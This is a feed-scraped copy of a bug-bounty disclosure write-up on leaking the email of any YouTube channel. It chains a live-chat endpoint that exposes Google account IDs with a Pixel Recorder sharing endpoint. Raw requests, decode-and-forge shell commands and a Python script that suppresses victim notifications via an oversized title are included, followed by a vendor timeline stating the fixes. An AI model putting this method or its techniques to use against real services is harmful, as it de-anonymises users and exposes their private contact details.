{
  "id": "41c914ca-590e-4ee6-8e72-5c04418e1d78",
  "title": "Leaking the email of any YouTube user for $10k",
  "link": "https://brutecat.com/articles/leaking-youtube-emails",
  "description": "Comments",
  "author": "",
  "published": "Wed, 12 Feb 2025 11:19:42 +0000",
  "source": "https://news.ycombinator.com/rss",
  "categories": null,
  "byline": "",
  "length": 11930,
  "excerpt": "What could've been the largest data breach in the world - an attack chain on Google services to leak the email address of any YouTube channel",
  "siteName": "brutecat.com",
  "favicon": "",
  "text": "\u003c Back 2025-02-12 Some time ago, I was looking for a research target in Google and was digging through the Internal People API (Staging) discovery document until I noticed something interesting: \"BlockedTarget\": { \"id\": \"BlockedTarget\", \"description\": \"The target of a user-to-user block, used to specify creation/deletion of blocks.\", \"type\": \"object\", \"properties\": { \"profileId\": { \"description\": \"Required. The obfuscated Gaia ID of the user targeted by the block.\", \"type\": \"string\" }, \"fallbackName\": { \"description\": \"Required for `BlockPeopleRequest`. A display name for the user being blocked. The viewer may see this in other surfaces later, if the blocked user has no profile name visible to them. Notes: * Required for `BlockPeopleRequest` (may not currently be enforced by validation, but should be provided) * For `UnblockPeopleRequest` this does not need to be set.\", \"type\": \"string\" } } },It seemed the Google-wide block user functionality was based on an obfuscated Gaia ID as well as a display name for that blocked user. The obfuscated Gaia ID is just a Google account identifier.‎ That seemed perfectly fine until I remembered this support page:‎ ‎ So, if you block someone on YouTube, you can leak their Google account identifier? I tested it out. I went to a random livestream, blocked a user and sure enough, it showed up in https://myaccount.google.com/blocklist‎ The fallback name was set as their channel name Mega Prime and the profile ID was their obfuscated Gaia ID 107183641464576740691‎ This was super strange to me because YouTube should never leak the underlying Google account of a YouTube channel. In the past, there's been several bugs to resolve these to an email address, so I was confident there was still a Gaia ID to Email in some old obscure Google product. Escalating this to 4 billion YouTube channels So, we can leak the Gaia ID of any live chat user, but can we escalate this to all channels on YouTube? As it turns out, when you click the 3 dots just to open the context menu, a request is fired:‎ ‎ Request POST /youtubei/v1/live_chat/get_item_context_menu?params=R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9\u0026pbj=1\u0026prettyPrint=false HTTP/2 Host: www.youtube.com Cookie: \u003credacted\u003eResponse HTTP/2 200 OK Content-Type: application/json; charset=UTF-8 Server: scaffolding on HTTPServer2 { ... \"serviceEndpoint\": { ... \"commandMetadata\": { \"webCommandMetadata\": { \"sendPost\": true, \"apiUrl\": \"/youtubei/v1/live_chat/moderate\" } }, \"moderateLiveChatEndpoint\": { \"params\": \"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=\" } } ... }That params is nothing more than just base64 encoded protobuf, which is a common encoding format used throughout Google.‎ If we try decoding that moderateLiveChatEndpoint params: $ echo -n \"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=\" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw 1 { 5 { 1: \"UChs0pSaEoNLV4mevBFGaoKA\" 2: \"36YnV9STBqc\" } } 10: 0 11: 1 12 { 1: \"113907466537670370590\" 2: \"SE-aYOb-uCg059qHRis_ow\" } 14: 0It actually just contains the Gaia ID of the user we want to block, we don't even need to block them! Let's check out the get_item_context_menu requests params too: $ echo -n \"R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9\" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw 3 { 5 { 1: \"UChs0pSaEoNLV4mevBFGaoKA\" 2: \"36YnV9STBqc\" } } 6 { 1: \"UCSE-aYOb-uCg059qHRis_ow\" }Seems to just contain the channel ID of the channel we're blocking, the livestream video ID and livestream author ID. Let's try to fake the request params with our own target's channel ID.‎ For this test, we'll use a Topic Channel since they are auto-generated by YouTube and guaranteed to not have any live chat messages. $ echo -n \"\u003cSNIP\u003e\" | base64 -d | sed 's/%3D/=/g' | base64 -d | sed 's/UCSE-aYOb-uCg059qHRis_ow/UCD2LZAT1j1DyVXq2R2BdusQ/g' | base64 | base64 R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlEwUXlURnBCVkRGcQpNVVI1VmxoeE1sSXlRbVIxYzFFPQo=‎ Testing this on /youtubei/v1/live_chat/get_item_context_menu: ... \"moderateLiveChatEndpoint\":{\"params\":\"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=\"} ...echo -n \"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=\" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw 1 { 5 { 1: \"UChs0pSaEoNLV4mevBFGaoKA\" 2: \"36YnV9STBqc\" } } 10: 0 11: 1 12 { 1: \"103261974221829892167\" 2: \"D2LZAT1j1DyVXq2R2BdusQ\" } 14: 0We can leak the Gaia ID of the channel - 103261974221829892167 The missing puzzle piece: Pixel Recorder I told my friend nathan about the YouTube Gaia ID leak and we started looking into old forgotten Google products since they probably contained some bug or logic flaw to resolve a Gaia ID to an email. Pixel Recorder was one of them. Nathan made a test recording on his Pixel phone and synced it to his Google account so we could access the endpoints on the web at https://recorder.google.com:‎ When we tried sharing the recording to a test email, that's when it hit us: Request POST /$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/WriteShareList HTTP/2 Host: pixelrecorder-pa.clients6.google.com Cookie: \u003credacted\u003e Content-Length: 80 Authorization: \u003credacted\u003e X-Goog-Api-Key: AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro Content-Type: application/json+protobuf Referer: https://recorder.google.com/ [\"7adab89e-4ace-4945-9f75-6fe250ccbe49\",null,[[\"113769094563819690011\",2,null]]]Response HTTP/2 200 OK Content-Type: application/json+protobuf; charset=UTF-8 Server: ESF Content-Length: 138 [\"28bc3792-9bdb-4aed-9a78-17b0954abc7d\",[[null,2,\"[email protected]\"]]]This endpoint was taking in the obfuscated Gaia ID and... returning the email?‎ We tested this with the obfuscated Gaia ID 107183641464576740691 we got from blocking that user on YouTube a while back and it worked: HTTP/2 200 OK Content-Type: application/json+protobuf; charset=UTF-8 Server: ESF Content-Length: 138 [\"28bc3792-9bdb-4aed-9a78-17b0954abc7d\",[[null,2,\"[email protected]\"],[null,2,\"[email protected]\"]]] A small problem: preventing notification to the target It seems that whenever we share a recording with a victim, they receive an email that looks like this:‎ ‎ This is really bad, and it would lower the impact of the bug quite a lot. On the share pop-up, there didn't seem to be any option to disable notifications. I tried leaking the full request proto via my tool req2proto, but there was nothing about disabling the email notification: syntax = \"proto3\"; package java.com.google.wireless.android.pixel.recorder.protos; import \"java/com/google/wireless/android/pixel/recorder/sharedclient/acl/protos/message.proto\"; message WriteShareListRequest { string recording_id = 1; string delete_obfuscated_gaia_ids = 2; ShareUser update_shared_users = 3; string sharing_message = 4; } message ShareUser { string obfuscated_gaia_id = 1; java.com.google.wireless.android.pixel.recorder.sharedclient.acl.protos.ResourceAccessRole role = 2; string email = 3; }Even trying to add and remove the user at the same time didn't work, the email was still sent. But that's when we realized - if it's including our recording title in the email subject, perhaps it wouldn't be able to send an email if our recording title was too long.‎ We hacked together a quick python script to test this out: import requests BASE_URL = \"https://pixelrecorder-pa.clients6.google.com/$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/\" headers = { \"Host\": \"pixelrecorder-pa.clients6.google.com\", \"Content-Type\": \"application/json+protobuf\", \"X-Goog-Api-Key\": \"AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro\", \"Origin\": \"https://recorder.google.com\" } def get_recording_uuid(share_id: str): payload = f\"[\\\"{share_id}\\\"]\" response = requests.post(BASE_URL + \"GetRecordingInfo\" + \"?alt=json\", headers=headers, data=payload) if response.status_code != 200: print(\"unknown error when getting recording uuid: \", response.json()) exit(1) try: response = response.json() except: print('can\\'t parse response when getting recording uuid: ', response.text) exit(1) return response[\"recording\"][\"uuid\"] def update_recording_title(share_id: str): x = 'X'*2500000 # 2.5 million char long title name! payload = f'[\"{share_id}\",\"{x}\"]' response = requests.post(BASE_URL + \"UpdateRecordingTitle\" + \"?alt=json\", headers=headers, data=payload) if response.status_code != 200: print(\"unknown error when updating recording title: \", response.json()) exit(1) def main(): share_id = input(\"Enter share ID: \") headers[\"Cookie\"] = input(\"Cookie header:\" ) headers[\"Authorization\"] = input(\"Authorization header: \") uuid = get_recording_uuid(share_id) print(\"UUID:\", uuid) update_recording_title(uuid) print(\"Updated recording title successfully.\") if __name__ == \"__main__\": main()... and the recording title was now 2.5 million letters long! There wasn't any server-side limit to the length of a recording name.‎ ‎ Trying to share the recording with a different test user... bingo! No notification email.‎ Putting it all together We basically have the full attack chain, we just have to put it together.‎ Leak the obfuscated Gaia ID of the YouTube channel from the Innertube endpoint /get_item_context_menu Share the Pixel recording with an extremely long name with the target to convert the Gaia ID to an email Remove the target from the Pixel recording (cleanup)‎ Here's a POC of the exploit in action: Timeline 15/09/24 - Report sent to vendor 16/09/24 - Vendor triaged report 16/09/24 - 🎉 Nice catch! 03/10/24 - Panel marks it as duplicate of existing-tracked bug, does botched patch of initial YouTube obfuscated Gaia ID disclosure 03/10/24 - Clarified to vendor that they haven't recognized Pixel recorder as vulnerability itself (since obfuscated Gaia IDs are leaked for Google Maps/Play reviewers) and provided vendor a work-around method to once again leak YouTube channel obfuscated Gaia IDs 05/11/24 - Panel awards $3,133. Rationale: Exploitation likelihood is medium. Issue qualified as an abuse-related methodology with high impact. 03/12/24 - Product team sent report back to panel for additional reward consideration, coordinates disclosure for 03/02/2025 12/12/24 - Panel awards an additional $7,500. Rationale: Exploitation likelihood is high. Issue qualified as an abuse-related methodology with high impact. Applied 1 downgrade from the base amount due to complexity of attack chain required. 29/01/25 - Vendor requests extension for disclosure to 12/02/2025 09/02/25 - Confirm to vendor that both parts of the exploit have been fixed (T+147 days since disclosure) 12/02/25 - Report disclosed You can contact me via or",
  "image": "/assets/youtube-email-disclosure.png",
  "html": "\u003cdiv id=\"readability-page-1\" class=\"page\"\u003e\u003carticle id=\"post\"\u003e\u003ca href=\"https://brutecat.com/\" data-svelte-h=\"svelte-5sfkfb\"\u003e\u0026lt; Back\u003c/a\u003e  \u003cp\u003e2025-02-12\u003c/p\u003e \u003cimg src=\"https://brutecat.com/assets/youtube-email-disclosure.png\" alt=\"\"/\u003e \u003cp\u003eSome time ago, I was looking for a research target in Google and was digging through the \u003ca href=\"https://staging-people-pa.sandbox.googleapis.com/$discovery/rest?key=AIzaSyBOh-LSTdP2ddSgqPk6ceLEKTb8viTIvdw\"\u003eInternal People API (Staging)\u003c/a\u003e discovery document until I noticed something interesting:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e   \u003cspan\u003e\u0026#34;BlockedTarget\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e{\u003c/span\u003e\n      \u003cspan\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e\u0026#34;BlockedTarget\u0026#34;\u003c/span\u003e\u003cspan\u003e,\u003c/span\u003e\n      \u003cspan\u003e\u0026#34;description\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e\u0026#34;The target of a user-to-user block, used to specify creation/deletion of blocks.\u0026#34;\u003c/span\u003e\u003cspan\u003e,\u003c/span\u003e\n      \u003cspan\u003e\u0026#34;type\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e\u0026#34;object\u0026#34;\u003c/span\u003e\u003cspan\u003e,\u003c/span\u003e\n      \u003cspan\u003e\u0026#34;properties\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e{\u003c/span\u003e\n        \u003cspan\u003e\u0026#34;profileId\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e{\u003c/span\u003e\n          \u003cspan\u003e\u0026#34;description\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e\u0026#34;Required. The obfuscated Gaia ID of the user targeted by the block.\u0026#34;\u003c/span\u003e\u003cspan\u003e,\u003c/span\u003e\n          \u003cspan\u003e\u0026#34;type\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e\u0026#34;string\u0026#34;\u003c/span\u003e\n        \u003cspan\u003e}\u003c/span\u003e\u003cspan\u003e,\u003c/span\u003e\n        \u003cspan\u003e\u0026#34;fallbackName\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e{\u003c/span\u003e\n          \u003cspan\u003e\u0026#34;description\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e\u0026#34;Required for `BlockPeopleRequest`. A display name for the user being blocked. The viewer may see this in other surfaces later, if the blocked user has no profile name visible to them. Notes: * Required for `BlockPeopleRequest` (may not currently be enforced by validation, but should be provided) * For `UnblockPeopleRequest` this does not need to be set.\u0026#34;\u003c/span\u003e\u003cspan\u003e,\u003c/span\u003e\n          \u003cspan\u003e\u0026#34;type\u0026#34;\u003c/span\u003e\u003cspan\u003e:\u003c/span\u003e \u003cspan\u003e\u0026#34;string\u0026#34;\u003c/span\u003e\n        \u003cspan\u003e}\u003c/span\u003e\n      \u003cspan\u003e}\u003c/span\u003e\n    \u003cspan\u003e}\u003c/span\u003e\u003cspan\u003e,\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eIt seemed the Google-wide block user functionality was based on an obfuscated Gaia ID as well as a display name for that blocked user. The obfuscated Gaia ID is just a Google account identifier.\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eThat seemed perfectly fine until I remembered \u003ca href=\"https://support.google.com/accounts/answer/6388749#zippy=%2Cuse-youtube-to-block-an-account\"\u003ethis support page\u003c/a\u003e:\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/use_youtube_to_block.png\"/\u003e\u003c/p\u003e\n\u003cp\u003e‎\u003c/p\u003e\n\u003cp\u003eSo, if you block someone on YouTube, you can leak their Google account identifier? I tested it out. I went to a random livestream, blocked a user and sure enough, it showed up in \u003ca href=\"https://myaccount.google.com/blocklist\"\u003ehttps://myaccount.google.com/blocklist\u003c/a\u003e\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/blocked_user.png\"/\u003e\u003c/p\u003e\n\u003cp\u003eThe fallback name was set as their channel name \u003cstrong\u003eMega Prime\u003c/strong\u003e and the profile ID was their obfuscated Gaia ID \u003cstrong\u003e107183641464576740691\u003c/strong\u003e\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eThis was super strange to me because YouTube should never leak the underlying Google account of a YouTube channel. In the past, there\u0026#39;s been several bugs to \u003ca href=\"https://sector035.nl/articles/2022-35\"\u003eresolve these to an email address\u003c/a\u003e, so I was confident there was still a Gaia ID to Email in some old obscure Google product.\u003c/p\u003e\n\n            \u003ch3 id=\"escalating-this-to-4-billion-youtube-channels\"\u003e\n              Escalating this to 4 billion YouTube channels\n            \u003c/h3\u003e\u003cp\u003eSo, we can leak the Gaia ID of any live chat user, but can we escalate this to all channels on YouTube? As it turns out, when you click the 3 dots just to open the context menu, a request is fired:\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/context_menu.png\"/\u003e\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRequest\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u003cspan\u003ePOST\u003c/span\u003e \u003cspan\u003e/youtubei/v1/live_chat/get_item_context_menu?params=R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9\u0026amp;pbj=1\u0026amp;prettyPrint=false\u003c/span\u003e \u003cspan\u003eHTTP/2\u003c/span\u003e\n\u003cspan\u003eHost\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003ewww.youtube.com\n\u003cspan\u003eCookie\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003e\u0026lt;redacted\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u003cspan\u003eHTTP/2\u003c/span\u003e \u003cspan\u003e200\u003c/span\u003e OK\n\u003cspan\u003eContent-Type\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003eapplication/json; charset=UTF-8\n\u003cspan\u003eServer\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003escaffolding on HTTPServer2\n\n\u003cspan\u003e{\n  \u003cspan\u003e...\u003c/span\u003e\n  \u003cspan\u003e\u0026#34;serviceEndpoint\u0026#34;\u003c/span\u003e: {\n    \u003cspan\u003e...\u003c/span\u003e\n    \u003cspan\u003e\u0026#34;commandMetadata\u0026#34;\u003c/span\u003e: {\n      \u003cspan\u003e\u0026#34;webCommandMetadata\u0026#34;\u003c/span\u003e: {\n        \u003cspan\u003e\u0026#34;sendPost\u0026#34;\u003c/span\u003e: \u003cspan\u003etrue\u003c/span\u003e,\n        \u003cspan\u003e\u0026#34;apiUrl\u0026#34;\u003c/span\u003e: \u003cspan\u003e\u0026#34;/youtubei/v1/live_chat/moderate\u0026#34;\u003c/span\u003e\n      }\n    },\n    \u003cspan\u003e\u0026#34;moderateLiveChatEndpoint\u0026#34;\u003c/span\u003e: {\n      \u003cspan\u003e\u0026#34;params\u0026#34;\u003c/span\u003e: \u003cspan\u003e\u0026#34;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=\u0026#34;\u003c/span\u003e\n    }\n  }\n  \u003cspan\u003e...\u003c/span\u003e\n}\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThat \u003ccode\u003eparams\u003c/code\u003e is nothing more than just base64 encoded protobuf, which is a common encoding format used throughout Google.\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eIf we try decoding that \u003ccode\u003emoderateLiveChatEndpoint\u003c/code\u003e params:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$ echo -n \u0026#34;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=\u0026#34; | base64\n -d | sed \u0026#39;s/%3D/=/g\u0026#39; | base64 -d | protoc --decode_raw\n1 {\n  5 {\n    1: \u0026#34;UChs0pSaEoNLV4mevBFGaoKA\u0026#34;\n    2: \u0026#34;36YnV9STBqc\u0026#34;\n  }\n}\n10: 0\n11: 1\n12 {\n  1: \u0026#34;113907466537670370590\u0026#34;\n  2: \u0026#34;SE-aYOb-uCg059qHRis_ow\u0026#34;\n}\n14: 0\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eIt actually just contains the Gaia ID of the user we want to block, we don\u0026#39;t even need to block them!\u003c/p\u003e\n\u003cp\u003eLet\u0026#39;s check out the \u003ccode\u003eget_item_context_menu\u003c/code\u003e requests params too:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$ echo -n \u0026#34;R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9\u0026#34; | base64 -d | sed \u0026#39;s/%3D/=/g\u0026#39; | base64 -d | protoc --decode_raw\n3 {\n  5 {\n    1: \u0026#34;UChs0pSaEoNLV4mevBFGaoKA\u0026#34;\n    2: \u0026#34;36YnV9STBqc\u0026#34;\n  }\n}\n6 {\n  1: \u0026#34;UCSE-aYOb-uCg059qHRis_ow\u0026#34;\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eSeems to just contain the channel ID of the channel we\u0026#39;re blocking, the livestream video ID and livestream author ID. Let\u0026#39;s try to fake the request params with our own target\u0026#39;s channel ID.\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eFor this test, we\u0026#39;ll use a \u003ca href=\"https://www.youtube.com/channel/UCD2LZAT1j1DyVXq2R2BdusQ\"\u003eTopic Channel\u003c/a\u003e since they are \u003ca href=\"https://support.google.com/youtube/answer/7636475#topicchannels\"\u003eauto-generated by YouTube\u003c/a\u003e and guaranteed to not have any live chat messages.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$ \u003cspan\u003eecho\u003c/span\u003e -n \u003cspan\u003e\u0026#34;\u0026lt;SNIP\u0026gt;\u0026#34;\u003c/span\u003e | \u003cspan\u003ebase64\u003c/span\u003e -d | sed \u003cspan\u003e\u0026#39;s/%3D/=/g\u0026#39;\u003c/span\u003e | \u003cspan\u003ebase64\u003c/span\u003e -d | sed \u003cspan\u003e\u0026#39;s/UCSE-aYOb-uCg059qHRis_ow/UCD2LZAT1j1DyVXq2R2BdusQ/g\u0026#39;\u003c/span\u003e | \u003cspan\u003ebase64\u003c/span\u003e | \u003cspan\u003ebase64\u003c/span\u003e\nR2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlEwUXlURnBCVkRGcQpNVVI1VmxoeE1sSXlRbVIxYzFFPQo=\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e‎\u003c/p\u003e\n\u003cp\u003eTesting this on \u003ccode\u003e/youtubei/v1/live_chat/get_item_context_menu\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e...\n\u0026#34;moderateLiveChatEndpoint\u0026#34;:{\u0026#34;params\u0026#34;:\u0026#34;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=\u0026#34;}\n...\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode\u003eecho -n \u0026#34;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=\u0026#34; | base64 -d | sed \u0026#39;s/%3D/=/g\u0026#39; | base64 -d | protoc --decode_raw\n1 {\n  5 {\n    1: \u0026#34;UChs0pSaEoNLV4mevBFGaoKA\u0026#34;\n    2: \u0026#34;36YnV9STBqc\u0026#34;\n  }\n}\n10: 0\n11: 1\n12 {\n  1: \u0026#34;103261974221829892167\u0026#34;\n  2: \u0026#34;D2LZAT1j1DyVXq2R2BdusQ\u0026#34;\n}\n14: 0\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWe can leak the Gaia ID of the channel - \u003cstrong\u003e103261974221829892167\u003c/strong\u003e\u003c/p\u003e\n\n            \u003ch3 id=\"the-missing-puzzle-piece-pixel-recorder\"\u003e\n              The missing puzzle piece: Pixel Recorder\n            \u003c/h3\u003e\u003cp\u003eI told my friend \u003ca href=\"https://schizo.org\"\u003enathan\u003c/a\u003e about the YouTube Gaia ID leak and we started looking into old forgotten Google products since they probably contained some bug or logic flaw to resolve a Gaia ID to an email. \u003ca href=\"https://recorder.google.com\"\u003ePixel Recorder\u003c/a\u003e was one of them. Nathan made a test recording on his Pixel phone and synced it to his Google account so we could access the endpoints on the web at \u003ca href=\"https://recorder.google.com\"\u003ehttps://recorder.google.com\u003c/a\u003e:\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/recorder_home_page.png\"/\u003e\u003c/p\u003e\n\u003cp\u003eWhen we tried sharing the recording to a test email, that\u0026#39;s when it hit us:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRequest\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u003cspan\u003ePOST\u003c/span\u003e \u003cspan\u003e/$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/WriteShareList\u003c/span\u003e \u003cspan\u003eHTTP/2\u003c/span\u003e\n\u003cspan\u003eHost\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003epixelrecorder-pa.clients6.google.com\n\u003cspan\u003eCookie\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003e\u0026lt;redacted\u0026gt;\n\u003cspan\u003eContent-Length\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003e80\n\u003cspan\u003eAuthorization\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003e\u0026lt;redacted\u0026gt;\n\u003cspan\u003eX-Goog-Api-Key\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003eAIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro\n\u003cspan\u003eContent-Type\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003eapplication/json+protobuf\n\u003cspan\u003eReferer\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003ehttps://recorder.google.com/\n\n\u003cspan\u003e[\u003cspan\u003e\u0026#34;7adab89e-4ace-4945-9f75-6fe250ccbe49\u0026#34;\u003c/span\u003e,null,\u003cspan\u003e[[\u0026#34;113769094563819690011\u0026#34;,2,null]]\u003c/span\u003e]\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u003cspan\u003eHTTP/2\u003c/span\u003e \u003cspan\u003e200\u003c/span\u003e OK\n\u003cspan\u003eContent-Type\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003eapplication/json+protobuf; charset=UTF-8\n\u003cspan\u003eServer\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003eESF\n\u003cspan\u003eContent-Length\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003e138\n\n\u003cspan\u003e[\u003cspan\u003e\u0026#34;28bc3792-9bdb-4aed-9a78-17b0954abc7d\u0026#34;\u003c/span\u003e,\u003cspan\u003e[[null,2,\u0026#34;\u003ca href=\"https://brutecat.com/cdn-cgi/l/email-protection\" data-cfemail=\"9bede9ebeffee8efa9dbfcf6faf2f7b5f8f4f6\"\u003e[email protected]\u003c/a\u003e\u0026#34;]]\u003c/span\u003e]\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThis endpoint was taking in the obfuscated Gaia ID and... \u003cstrong\u003ereturning the email?\u003c/strong\u003e\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eWe tested this with the obfuscated Gaia ID \u003ccode\u003e107183641464576740691\u003c/code\u003e we got from blocking that user on YouTube a while back and \u003cstrong\u003eit worked\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u003cspan\u003eHTTP/2\u003c/span\u003e \u003cspan\u003e200\u003c/span\u003e OK\n\u003cspan\u003eContent-Type\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003eapplication/json+protobuf; charset=UTF-8\n\u003cspan\u003eServer\u003c/span\u003e\u003cspan\u003e: 